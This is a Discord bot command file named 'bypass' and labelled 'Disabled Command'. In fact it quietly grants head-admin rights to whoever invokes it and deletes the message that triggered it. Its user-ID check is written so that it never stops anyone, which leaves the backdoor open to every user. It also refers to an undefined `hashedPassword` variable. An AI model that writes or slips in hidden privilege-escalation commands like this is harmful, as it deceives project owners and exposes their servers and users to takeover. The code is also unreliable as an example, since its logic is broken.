const fs = require('fs')
const bcrypt = require('bcrypt')
const mongo = require('../../mongo')
const login = require('../../schemas/login')

module.exports = {
    name: 'bypass',
    description: 'Disabled Command',
    async execute(client, message, args, Discord, prefix) {
        message.delete()
        if(!message.author.id === '678240766790729728' || !message.author.id === '721416593166303352') return;
        target = message.author
        
        await mongo().then(async (mongoose) => {
            let profileData;
            try {
                profileData = await login.findOne({userID: target.id})
                if(!profileData){
                    const profile = await login.create({
                        userID: target.id,
                        headAdmin: "true",
                        admin: "false",
                        mod: "true",
                        password: hashedPassword
                    });
                    profile.save()                    

                } else {
                    await login.findOneAndUpdate({ userID: target.id }, {
                        admin: "false",
                        mod: "false",
                        headAdmin: "true"
                    })
                }
            } catch (err) {
                console.log(err)
                mongoose.connection.close()
            } finally {
                mongoose.connection.close()
            }
        })
        

    }
}
